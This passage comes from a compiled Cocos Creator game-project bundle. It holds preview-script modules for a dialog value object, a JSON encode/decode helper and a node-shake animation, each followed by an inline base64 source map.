255qE5pWw5o2uXHJcbiAgICBsZXQgbmV3RGF0YSA9IFtdO1xyXG4gICAgZm9yKGxldCBpIGluIGQpe1xyXG4gICAgICAgIGxldCB0ZW1wMiA9IGRbaV07XHJcbiAgICAgICAgbmV3RGF0YVtpXSA9IHt9O1xyXG4gICAgICAgIGZvcihsZXQgaiBpbiB0ZW1wMil7XHJcbiAgICAgICAgICAgIGxldCBrZXkgPSB0ZW1wMVtqXTtcclxuICAgICAgICAgICAgbGV0IHZhbCA9IG51bGw7XHJcbiAgICAgICAgICAgIHZhbCA9IHRlbXAyW2pdO1xyXG4gICAgICAgICAgICBuZXdEYXRhW2ldW2tleV0gPSB2YWw7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG4gICAgcmV0dXJuIG5ld0RhdGE7XHJcbn1cclxuXHJcbmxldCBleGNlbFRhYmxlcyA9IG5ldyBNYXA8U3RyaW5nLCBBcnJheT4oKTtcclxuXHJcbmV4cG9ydCBjbGFzcyBFeGNlbENvbmZpZ3tcclxuICAgIHN0YXRpYyBhc3luYyBsb2FkQWxsRXhjZWwoZXhjZWxEaXI6c3RyaW5nLCBwcm9ncmVzc0NhbGxiYWNrPzogKGNvbXBsZXRlZENvdW50OiBudW1iZXIsIHRvdGFsQ291bnQ6IG51bWJlciwgaXRlbTogYW55KSA9PiB2b2lkKXtcclxuICAgICAgICBsZXQgW29iamVjdHMsIHVybHNdID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNEaXJBd2FpdChleGNlbERpciwgcHJvZ3Jlc3NDYWxsYmFjayk7XHJcbiAgICAgICAgZm9yIChsZXQgaT0wOyBpPG9iamVjdHMubGVuZ3RoOyBpKyspe1xyXG4gICAgICAgICAgICBsZXQganNvbiA9IG9iamVjdHNbaV07XHJcbiAgICAgICAgICAgIGlmICh0eXBlb2Ygb2JqZWN0c1tpXS5qc29uICE9IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICAgICAganNvbiA9IG9iamVjdHNbaV0uanNvbjtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBleGNlbFRhYmxlcy5zZXQodXJsc1tpXSwgZGF0YTJKc29uKGpzb24pKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIGxvYWRFeGNlbChmaWxlUGF0aDpTdHJpbmcpe1xyXG4gICAgICAgIGxldCBvYmplY3QgPSBhd2FpdCBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KGZpbGVQYXRoKTtcclxuICAgICAgICBsZXQganNvbiA9IG9iamVjdDtcclxuICAgICAgICBpZiAodHlwZW9mIG9iamVjdC5qc29uICE9IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICBqc29uID0gb2JqZWN0Lmpzb247XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCBkYXRhQXJyID1kYXRhMkpzb24oanNvbik7XHJcbiAgICAgICAgZXhjZWxUYWJsZXMuc2V0KGZpbGVQYXRoLCBkYXRhQXJyKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgZ2V0RXhjZWxUYWJsZShmaWxlUGF0aDpzdHJpbmcpIHtcclxuICAgICAgICByZXR1cm4gZXhjZWxUYWJsZXMuZ2V0KGZpbGVQYXRoKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgZ2V0RXhjZWxMaW5lKGZpbGVQYXRoOlN0cmluZywga2V5OlN0cmluZywgZmluZFZhbHVlOmFueSk6T2JqZWN0e1xyXG4gICAgICAgIGxldCBhcnJheSA9IHRoaXMuZ2V0RXhjZWxUYWJsZShmaWxlUGF0aCk7XHJcbiAgICAgICAgZm9yIChsZXQgaW5kZXggaW4gYXJyYXkpe1xyXG4gICAgICAgICAgICBpZiAoYXJyYXlbaW5kZXhdW2tleV0gPT0gZmluZFZhbHVlKXtcclxuICAgICAgICAgICAgICAgIHJldHVybiBhcnJheVtpbmRleF07XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIG51bGw7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/dialog/DialogVO.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1dd20ilzSlM9LWWZ+mi3S4D', 'DialogVO');
// framework/dialog/DialogVO.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.DialogVO = void 0;
var DialogVO = /** @class */ (function () {
    function DialogVO() {
        this.title = { string: "提示" };
        this.content = { string: "您还没有设置内容" };
        this.closeButtonNode = null;
        this.closeButtonSrpite = null;
        this.layoutOfLeftRight = null;
        /** 左边按钮 */
        this.leftButtonNode = { active: false };
        this.leftButtonSprite = null;
        this.layoutOfLeftButton = null;
        this.iconNodeOfLeftButton = { active: false };
        this.iconSpriteOfLeftButton = null;
        this.textNodeOfLeftButton = null;
        this.textOfLeftButton = { string: "取消" };
        /** 右边按钮 **/
        this.rightButtonNode = null;
        this.rightButtonSprite = null;
        this.layoutOfRightButton = null;
        this.iconNodeOfRightButton = { active: false };
        this.iconSpriteOfRightButton = null;
        this.textNodeOfRightButton = null;
        this.textOfRightButton = { string: "确认" };
    }
    DialogVO.colorString = function (str, color) {
        var colorValue = color || "##7c4800";
        return "<color=#7c4800>" + str + "</c>";
    };
    return DialogVO;
}());
exports.DialogVO = DialogVO;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZGlhbG9nL0RpYWxvZ1ZPLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOzs7QUFFbkc7SUFBQTtRQUNJLFVBQUssR0FBVyxFQUFDLE1BQU0sRUFBQyxJQUFJLEVBQUMsQ0FBQztRQUU5QixZQUFPLEdBQVcsRUFBQyxNQUFNLEVBQUMsVUFBVSxFQUFDLENBQUM7UUFFdEMsb0JBQWUsR0FBVSxJQUFJLENBQUM7UUFFOUIsc0JBQWlCLEdBQVUsSUFBSSxDQUFDO1FBRWhDLHNCQUFpQixHQUFVLElBQUksQ0FBQztRQUVoQyxXQUFXO1FBQ1gsbUJBQWMsR0FBVSxFQUFDLE1BQU0sRUFBQyxLQUFLLEVBQUMsQ0FBQztRQUV2QyxxQkFBZ0IsR0FBVSxJQUFJLENBQUM7UUFFL0IsdUJBQWtCLEdBQVUsSUFBSSxDQUFDO1FBRWpDLHlCQUFvQixHQUFVLEVBQUMsTUFBTSxFQUFDLEtBQUssRUFBQyxDQUFDO1FBRTdDLDJCQUFzQixHQUFVLElBQUksQ0FBQztRQUVyQyx5QkFBb0IsR0FBVSxJQUFJLENBQUM7UUFFbkMscUJBQWdCLEdBQVUsRUFBQyxNQUFNLEVBQUMsSUFBSSxFQUFDLENBQUM7UUFFeEMsWUFBWTtRQUNaLG9CQUFlLEdBQVUsSUFBSSxDQUFDO1FBRTlCLHNCQUFpQixHQUFVLElBQUksQ0FBQztRQUVoQyx3QkFBbUIsR0FBVSxJQUFJLENBQUM7UUFFbEMsMEJBQXFCLEdBQVUsRUFBQyxNQUFNLEVBQUMsS0FBSyxFQUFDLENBQUM7UUFFOUMsNEJBQXVCLEdBQVUsSUFBSSxDQUFDO1FBRXRDLDBCQUFxQixHQUFVLElBQUksQ0FBQztRQUVwQyxzQkFBaUIsR0FBVSxFQUFDLE1BQU0sRUFBQyxJQUFJLEVBQUMsQ0FBQztJQVE3QyxDQUFDO0lBTFUsb0JBQVcsR0FBbEIsVUFBbUIsR0FBVSxFQUFFLEtBQWE7UUFDeEMsSUFBSSxVQUFVLEdBQUcsS0FBSyxJQUFJLFVBQVUsQ0FBQztRQUNyQyxPQUFPLG9CQUFrQixHQUFHLFNBQU0sQ0FBQztJQUN2QyxDQUFDO0lBRUwsZUFBQztBQUFELENBL0NBLEFBK0NDLElBQUE7QUEvQ1ksNEJBQVEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcbmV4cG9ydCBjbGFzcyBEaWFsb2dWTyB7XHJcbiAgICB0aXRsZTogT2JqZWN0ID0ge3N0cmluZzpcIuaPkOekulwifTtcclxuXHJcbiAgICBjb250ZW50OiBPYmplY3QgPSB7c3RyaW5nOlwi5oKo6L+Y5rKh5pyJ6K6+572u5YaF5a65XCJ9O1xyXG5cclxuICAgIGNsb3NlQnV0dG9uTm9kZTpPYmplY3QgPSBudWxsO1xyXG5cclxuICAgIGNsb3NlQnV0dG9uU3JwaXRlOk9iamVjdCA9IG51bGw7XHJcblxyXG4gICAgbGF5b3V0T2ZMZWZ0UmlnaHQ6T2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICAvKiog5bem6L655oyJ6ZKuICovXHJcbiAgICBsZWZ0QnV0dG9uTm9kZTpPYmplY3QgPSB7YWN0aXZlOmZhbHNlfTtcclxuXHJcbiAgICBsZWZ0QnV0dG9uU3ByaXRlOk9iamVjdCA9IG51bGw7XHJcblxyXG4gICAgbGF5b3V0T2ZMZWZ0QnV0dG9uOk9iamVjdCA9IG51bGw7XHJcblxyXG4gICAgaWNvbk5vZGVPZkxlZnRCdXR0b246T2JqZWN0ID0ge2FjdGl2ZTpmYWxzZX07XHJcblxyXG4gICAgaWNvblNwcml0ZU9mTGVmdEJ1dHRvbjpPYmplY3QgPSBudWxsO1xyXG5cclxuICAgIHRleHROb2RlT2ZMZWZ0QnV0dG9uOk9iamVjdCA9IG51bGw7XHJcblxyXG4gICAgdGV4dE9mTGVmdEJ1dHRvbjpPYmplY3QgPSB7c3RyaW5nOlwi5Y+W5raIXCJ9O1xyXG5cclxuICAgIC8qKiDlj7PovrnmjInpkq4gKiovXHJcbiAgICByaWdodEJ1dHRvbk5vZGU6T2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICByaWdodEJ1dHRvblNwcml0ZTpPYmplY3QgPSBudWxsO1xyXG5cclxuICAgIGxheW91dE9mUmlnaHRCdXR0b246T2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICBpY29uTm9kZU9mUmlnaHRCdXR0b246T2JqZWN0ID0ge2FjdGl2ZTpmYWxzZX07XHJcblxyXG4gICAgaWNvblNwcml0ZU9mUmlnaHRCdXR0b246T2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICB0ZXh0Tm9kZU9mUmlnaHRCdXR0b246T2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICB0ZXh0T2ZSaWdodEJ1dHRvbjpPYmplY3QgPSB7c3RyaW5nOlwi56Gu6K6kXCJ9O1xyXG5cclxuXHJcbiAgICBzdGF0aWMgY29sb3JTdHJpbmcoc3RyOnN0cmluZywgY29sb3I/OnN0cmluZyk6c3RyaW5ne1xyXG4gICAgICAgIGxldCBjb2xvclZhbHVlID0gY29sb3IgfHwgXCIjIzdjNDgwMFwiO1xyXG4gICAgICAgIHJldHVybiBgPGNvbG9yPSM3YzQ4MDA+JHtzdHJ9PC9jPmA7XHJcbiAgICB9XHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/converter/JsonConverter.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6ad4356PtNOWakao1ECJinM', 'JsonConverter');
// framework/converter/JsonConverter.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.JsonConverter = void 0;
var JsonConverter = /** @class */ (function () {
    function JsonConverter() {
    }
    JsonConverter.prototype.encode = function () {
        var json = {};
        for (var attr in this) {
            if (typeof this[attr] != "function") {
                json[attr] = this[attr];
            }
        }
        return json;
    };
    JsonConverter.prototype.decode = function (data) {
        if (typeof data == "string") {
            data = JSON.parse(data);
        }
        for (var attr in this) {
            if (typeof this[attr] != "function") {
                if (typeof data[attr] == "undefined") {
                    throw this.constructor.name + ".decode data not found attr===>" + attr;
                }
                this[attr] = data[attr];
            }
        }
        return this;
    };
    return JsonConverter;
}());
exports.JsonConverter = JsonConverter;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29udmVydGVyL0pzb25Db252ZXJ0ZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQUluRztJQUFBO0lBMkJBLENBQUM7SUF6QkcsOEJBQU0sR0FBTjtRQUNJLElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQztRQUNkLEtBQUksSUFBSSxJQUFJLElBQUksSUFBSSxFQUFFO1lBQ2xCLElBQUksT0FBTyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksVUFBVSxFQUFDO2dCQUNoQyxJQUFJLENBQUMsSUFBSSxDQUFDLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO2FBQzNCO1NBQ0o7UUFDRCxPQUFPLElBQUksQ0FBQztJQUNoQixDQUFDO0lBRUQsOEJBQU0sR0FBTixVQUFPLElBQVE7UUFDWCxJQUFJLE9BQU8sSUFBSSxJQUFJLFFBQVEsRUFBQztZQUN4QixJQUFJLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQztTQUMzQjtRQUVELEtBQUksSUFBSSxJQUFJLElBQUksSUFBSSxFQUFFO1lBQ2xCLElBQUksT0FBTyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksVUFBVSxFQUFDO2dCQUNoQyxJQUFJLE9BQU8sSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLFdBQVcsRUFBRTtvQkFDbEMsTUFBUyxJQUFJLENBQUMsV0FBVyxDQUFDLElBQUksdUNBQWtDLElBQU0sQ0FBQztpQkFDMUU7Z0JBQ0QsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQzthQUMzQjtTQUNKO1FBQ0QsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUNMLG9CQUFDO0FBQUQsQ0EzQkEsQUEyQkMsSUFBQTtBQTNCWSxzQ0FBYSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuaW1wb3J0IHtJQ29udmVydGVyfSBmcm9tIFwiLi9JQ29udmVydGVyXCI7XHJcblxyXG5leHBvcnQgY2xhc3MgSnNvbkNvbnZlcnRlciBpbXBsZW1lbnRzIElDb252ZXJ0ZXJ7XHJcblxyXG4gICAgZW5jb2RlKCl7XHJcbiAgICAgICAgbGV0IGpzb24gPSB7fTtcclxuICAgICAgICBmb3IobGV0IGF0dHIgaW4gdGhpcykge1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIHRoaXNbYXR0cl0gIT0gXCJmdW5jdGlvblwiKXtcclxuICAgICAgICAgICAgICAgIGpzb25bYXR0cl0gPSB0aGlzW2F0dHJdO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiBqc29uO1xyXG4gICAgfVxyXG5cclxuICAgIGRlY29kZShkYXRhOmFueSl7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBkYXRhID09IFwic3RyaW5nXCIpe1xyXG4gICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGZvcihsZXQgYXR0ciBpbiB0aGlzKSB7XHJcbiAgICAgICAgICAgIGlmICh0eXBlb2YgdGhpc1thdHRyXSAhPSBcImZ1bmN0aW9uXCIpe1xyXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRhW2F0dHJdID09IFwidW5kZWZpbmVkXCIpIHtcclxuICAgICAgICAgICAgICAgICAgICB0aHJvdyBgJHt0aGlzLmNvbnN0cnVjdG9yLm5hbWV9LmRlY29kZSBkYXRhIG5vdCBmb3VuZCBhdHRyPT09PiR7YXR0cn1gO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgdGhpc1thdHRyXSA9IGRhdGFbYXR0cl07XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIHRoaXM7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/Shake.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '47c33eZuWxPkonS55ujUXfr', 'Shake');
// framework/extend/Shake.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.Shake = void 0;
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Shake = /** @class */ (function (_super) {
    __extends(Shake, _super);
    function Shake() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._initial_x = 0;
        _this._initial_y = 0;
        _this._strength_x = 0;
        _this._strength_y = 0;
        return _this;
    }
    Shake_1 = Shake;
    /**
     *  创建抖动动画
     * @param {number} duration     动画持续时长
     * @param {number} strength_x   抖动幅度： x方向
     * @param {number} strength_y   抖动幅度： y方向
     * @returns {Shake}
     */
    Shake.create = function (duration, strength_x, strength_y) {
        var act = new Shake_1();
        act.initWithDuration(duration, strength_x, strength_y);
        return act;
    };
    Shake.prototype.initWithDuration = function (duration, strength_x, strength_y) {
        cc.ActionInterval.prototype['initWithDuration'].apply(this, arguments);
        this._strength_x = strength_x;
        this._strength_y = strength_y;
        return true;
    };
    Shake.prototype.fgRangeRand = function (min, max) {
        var rnd = Math.random();
        return rnd * (max - min) + min;
    };
    Shake.prototype.update = function (time) {
        var randx = this.fgRangeRand(-this._strength_x, this._strength_x);
        var randy = this.fgRangeRand(-this._strength_y, this._strength_y);
        this.getTarget().setPosition(randx + this._initial_x, randy + this._initial_y);
    };
    Shake.prototype.startWithTarget = function (target) {
        cc.ActionInterval.prototype['startWithTarget'].apply(this, arguments);
        this._initial_x = target.x;
        this._initial_y = target.y;
    };
    Shake.prototype.stop = function () {
        this.getTarget().setPosition(new cc.Vec2(this._initial_x, this._initial_y));
        cc.ActionInterval.prototype['stop'].apply(this);
    };
    var Shake_1;
    Shake = Shake_1 = __decorate([
        ccclass
    ], Shake);
    return Shake;
}(cc.ActionInterval));
exports.Shake = Shake;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL1NoYWtlLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBQU0sSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBNEIseUJBQWlCO0lBQTdDO1FBQUEscUVBd0RDO1FBckRXLGdCQUFVLEdBQVUsQ0FBQyxDQUFDO1FBQ3RCLGdCQUFVLEdBQVUsQ0FBQyxDQUFDO1FBQ3RCLGlCQUFXLEdBQVUsQ0FBQyxDQUFDO1FBQ3ZCLGlCQUFXLEdBQVUsQ0FBQyxDQUFDOztJQWtEbkMsQ0FBQztjQXhEYSxLQUFLO0lBUWY7Ozs7OztPQU1HO0lBQ1csWUFBTSxHQUFwQixVQUFxQixRQUFlLEVBQUMsVUFBaUIsRUFBQyxVQUFpQjtRQUVwRSxJQUFJLEdBQUcsR0FBUyxJQUFJLE9BQUssRUFBRSxDQUFDO1FBQzVCLEdBQUcsQ0FBQyxnQkFBZ0IsQ0FBRSxRQUFRLEVBQUMsVUFBVSxFQUFDLFVBQVUsQ0FBRSxDQUFDO1FBQ3ZELE9BQU8sR0FBRyxDQUFDO0lBQ2YsQ0FBQztJQUVNLGdDQUFnQixHQUF2QixVQUF3QixRQUFlLEVBQUMsVUFBaUIsRUFBQyxVQUFpQjtRQUV2RSxFQUFFLENBQUMsY0FBYyxDQUFDLFNBQVMsQ0FBQyxrQkFBa0IsQ0FBQyxDQUFDLEtBQUssQ0FBQyxJQUFJLEVBQUMsU0FBUyxDQUFDLENBQUM7UUFDdEUsSUFBSSxDQUFDLFdBQVcsR0FBRyxVQUFVLENBQUM7UUFDOUIsSUFBSSxDQUFDLFdBQVcsR0FBRyxVQUFVLENBQUM7UUFDOUIsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUVNLDJCQUFXLEdBQWxCLFVBQW1CLEdBQVUsRUFBQyxHQUFVO1FBRXBDLElBQUksR0FBRyxHQUFVLElBQUksQ0FBQyxNQUFNLEVBQUUsQ0FBQztRQUMvQixPQUFPLEdBQUcsR0FBRyxDQUFDLEdBQUcsR0FBRyxHQUFHLENBQUMsR0FBRyxHQUFHLENBQUM7SUFDbkMsQ0FBQztJQUVNLHNCQUFNLEdBQWIsVUFBYyxJQUFXO1FBRXJCLElBQUksS0FBSyxHQUFHLElBQUksQ0FBQyxXQUFXLENBQUMsQ0FBQyxJQUFJLENBQUMsV0FBVyxFQUFDLElBQUksQ0FBQyxXQUFXLENBQUMsQ0FBQztRQUNqRSxJQUFJLEtBQUssR0FBRyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsSUFBSSxDQUFDLFdBQVcsRUFBQyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUM7UUFDakUsSUFBSSxDQUFDLFNBQVMsRUFBRSxDQUFDLFdBQVcsQ0FBQyxLQUFLLEdBQUcsSUFBSSxDQUFDLFVBQVUsRUFBQyxLQUFLLEdBQUcsSUFBSSxDQUFDLFVBQVUsQ0FBQyxDQUFDO0lBQ2xGLENBQUM7SUFFTSwrQkFBZSxHQUF0QixVQUF1QixNQUFjO1FBRWpDLEVBQUUsQ0FBQyxjQUFjLENBQUMsU0FBUyxDQUFDLGlCQUFpQixDQUFDLENBQUMsS0FBSyxDQUFDLElBQUksRUFBQyxTQUFTLENBQUMsQ0FBQztRQUNyRSxJQUFJLENBQUMsVUFBVSxHQUFHLE1BQU0sQ0FBQyxDQUFDLENBQUM7UUFDM0IsSUFBSSxDQUFDLFVBQVUsR0FBRyxNQUFNLENBQUMsQ0FBQyxDQUFDO0lBQy9CLENBQUM7SUFFTSxvQkFBSSxHQUFYO1FBRUksSUFBSSxDQUFDLFNBQVMsRUFBRSxDQUFDLFdBQVcsQ0FBQyxJQUFJLEVBQUUsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFVBQVUsRUFBQyxJQUFJLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQztRQUUzRSxFQUFFLENBQUMsY0FBYyxDQUFDLFNBQVMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLENBQUM7SUFDcEQsQ0FBQzs7SUF2RFMsS0FBSztRQURsQix